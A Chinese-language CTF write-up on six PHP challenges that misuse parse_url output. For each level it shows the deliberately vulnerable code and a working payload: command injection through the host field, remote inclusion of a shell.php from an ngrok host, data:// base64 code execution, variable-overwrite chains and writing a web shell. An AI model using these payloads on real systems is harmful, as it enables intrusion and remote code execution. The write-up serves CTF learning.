>考点: *parse_url解析后的数组*
>parse_url() 函数返回一个包含URL各个组成部分的关联数组，其中可能包括下列元素：
	scheme：表示URL的协议部分，如 "http"、"https" 等。
	host：表示URL的主机名或域名部分。
	port：表示URL的端口部分，如果未指定则返回null。
	user：表示URL的用户名部分，如果未指定则返回null。
	pass：表示URL的密码部分，如果未指定则返回null。
	path：表示URL的路径部分。
	query：表示URL的查询部分，即问号后面的部分，如果未指定则返回null。
	fragment：表示URL的片段部分，即#号后面的部分，如果未指定则返回null
	*scheme://user:pass@host:port/path?query#fragment*


### 第一关
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-05-10 09:52:06
# @Last Modified by:   h1xa
# @Last Modified time: 2023-05-10 10:58:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$data = parse_url($_GET['u']);

eval($data['host']);
```

显然只需要传入host即可
`?u=http://system('ls');` 但是注意不能输入分号`;`,会被parse_url解析到`path`部分
*payload*
`?u=http://system('cd ..;cd ..;cd..; cd..;cd ..;cat flag_is_here.txt');`

### 第二关
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-05-10 09:52:06
# @Last Modified by:   h1xa
# @Last Modified time: 2023-05-12 13:25:53
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$data = parse_url($_GET['u']);

include $data['host'].$data['path'];
```

可以看到没有了eval执行命令,只能文件包含,当时被卡了很久,最终采用远程文件包含做出来了

payload `?u=http://https:://941b-111-18-39-14.ngrok-free.app/shell.php`

`host`=>`https` `path`=>`//941b-111-18-39-14.ngrok-free.app/shell.php`

那么这里为什么有俩个冒号呢,根据群里佬的解析过程
从后往前解析的话,如果遇到一个冒号就会认为是端口 
| data:8080 | data::8080 |
| --------- | ---------- |
| data=>host,8080=>port          | data:=>host,8080=>port           |
所以右边的会才能将冒号外带出来

当然,这道题也是有本地文件包含的解法的
`?u=http://data:://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==`

### 第三关
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-05-10 09:52:06
# @Last Modified by:   h1xa
# @Last Modified time: 2023-05-12 13:29:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$data = parse_url($_GET['u']);

include $data['scheme'].$data['path'];
```

与上一关不同的是 `host` 变为了 `scheme` 

*payload*
`?u=https:://941b-111-18-39-14.ngrok-free.app/shell.php`
拆分一下 `scheme` => `https`    `path`=> `://941b-111-18-39-14.ngrok-free.app/shell.php`

本地包含
`?u=data:://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==`

### 第四关
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-05-10 09:52:06
# @Last Modified by:   h1xa
# @Last Modified time: 2023-05-12 13:29:35
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

$data = parse_url($_GET['u']);

system($data['host']);

```

*最喜欢的一集*
`?u=http://cd ..;cd ..;cd ..;ls;`
直接就能执行命令

### 第五关
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-05-10 09:52:06
# @Last Modified by:   h1xa
# @Last Modified time: 2023-05-12 13:29:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

extract(parse_url($_GET['u']));
include $$$$$$host;
```

从`$host`开始,多次变量覆盖
*`scheme://user:pass@host:port/path?query#fragment`*
其中port变量如果为非数字就会报错,并且PHP变量不支持数字开头,所以变量覆盖没有它的份

从host开始,那就先修改host的值为另一个变量名,再依次修改
*`fragment://scheme:user@pass:port/path?<payload>#query`*``
顺序 `$$$$$$host`=>`$$$$$pass`=>`$$$$user`=>`$$$scheme`=>`$$fragment`=>`$query`=>`<payload>`

`<payload>`里插入的内容上面已经提到了,远程文件包含或者data伪协议都可


### 第六关
```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-05-10 09:52:06
# @Last Modified by:   h1xa
# @Last Modified time: 2023-05-12 13:29:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

$data = parse_url($_GET['u']);

file_put_contents($data['path'], $data['host']);
```


第一个参数是文件名,并且path是以`/`开头的,所以我们要写文件的绝对路径到我们的web目录
`/var/www/html/shell.php`
第二个参数是文件内容,但是由于php开启标签需要`?`,如果直接出现在url里就会被解析为query参数,url编码也无法绕过
不难想到使用`<script language='php'> system('ls');` 

*payload*
`?u=http://<script language='php'> system('ls');/var/www/html/shell.php`

成功将命令写入到shell.php
直接访问shell.php即可看到命令执行结果

